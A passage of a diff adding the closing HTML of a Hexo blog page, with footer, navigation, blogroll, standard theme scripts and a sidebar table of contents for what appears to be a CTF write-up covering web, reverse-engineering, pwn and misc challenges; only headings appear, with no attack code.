+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Write-up/" rel="tag"># Write up</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/25/%E6%95%B0%E7%BB%84%E9%94%AE%E6%88%AA%E6%96%AD%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/" rel="next" title="数组键截断与参数注入">
+                <i class="fa fa-chevron-left"></i> 数组键截断与参数注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/31/hello-world/" rel="prev" title="Hello World">
+                Hello World <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="sketch_pl4ne" />
+            
+              <p class="site-author-name" itemprop="name">sketch_pl4ne</p>
+              <p class="site-description motion-element" itemprop="description">wym</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.zhaoj.in/" title="glzjin" target="_blank">glzjin</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lihuaiqiu.github.io/" title="离怀秋" target="_blank">离怀秋</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/wfzWebSecuity/" title="tr1ple" target="_blank">tr1ple</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southsea.st/" title="南溟" target="_blank">南溟</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB"><span class="nav-number">1.1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Fake-XML-cookbook"><span class="nav-number">1.1.1.</span> <span class="nav-text">Fake XML cookbook</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#True-XML-cookbook（未解出）"><span class="nav-number">1.1.2.</span> <span class="nav-text">True XML cookbook（未解出）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flask"><span class="nav-number">1.1.3.</span> <span class="nav-text">flask</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#upload-your-shell"><span class="nav-number">1.1.4.</span> <span class="nav-text">upload your shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#simple-xss"><span class="nav-number">1.1.5.</span> <span class="nav-text">simple_xss</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQLi"><span class="nav-number">1.1.6.</span> <span class="nav-text">SQLi</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phar-matches-everything-未解出"><span class="nav-number">1.1.7.</span> <span class="nav-text">phar matches everything (未解出)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#easyphp"><span class="nav-number">1.1.8.</span> <span class="nav-text">easyphp</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Level1"><span class="nav-number">1.1.8.1.</span> <span class="nav-text">Level1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Level2"><span class="nav-number">1.1.8.2.</span> <span class="nav-text">Level2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Level3"><span class="nav-number">1.1.8.3.</span> <span class="nav-text">Level3</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#replace"><span class="nav-number">1.1.9.</span> <span class="nav-text">replace</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#backdoor"><span class="nav-number">1.1.10.</span> <span class="nav-text">backdoor</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RE"><span class="nav-number">1.2.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DEBUG"><span class="nav-number">1.2.1.</span> <span class="nav-text">DEBUG</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PWN"><span class="nav-number">1.3.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#hello-pwn"><span class="nav-number">1.3.1.</span> <span class="nav-text">hello_pwn</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MISC"><span class="nav-number">1.4.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#a-good-idea"><span class="nav-number">1.4.1.</span> <span class="nav-text">a_good_idea</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Become-a-Rockstar"><span class="nav-number">1.4.2.</span> <span class="nav-text">Become a Rockstar</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Bright-Body-I"><span class="nav-number">1.4.3.</span> <span class="nav-text">Bright Body I</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#有内鬼-终止交易"><span class="nav-number">1.4.4.</span> <span class="nav-text">有内鬼,终止交易</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#键盘侠"><span class="nav-number">1.4.5.</span> <span class="nav-text">键盘侠</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#What’s-this"><span class="nav-number">1.4.6.</span> <span class="nav-text">What’s this</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2077"><span class="nav-number">1.4.7.</span> <span class="nav-text">2077</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pip-install"><span class="nav-number">1.4.8.</span> <span class="nav-text">pip install</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NCTF2019问卷调查"><span class="nav-number">1.4.9.</span> <span class="nav-text">NCTF2019问卷调查</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#keyboard"><span class="nav-number">1.4.10.</span> <span class="nav-text">keyboard</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">2.</span> <span class="nav-text">小结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sketch_pl4ne</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">36.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three-waves.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
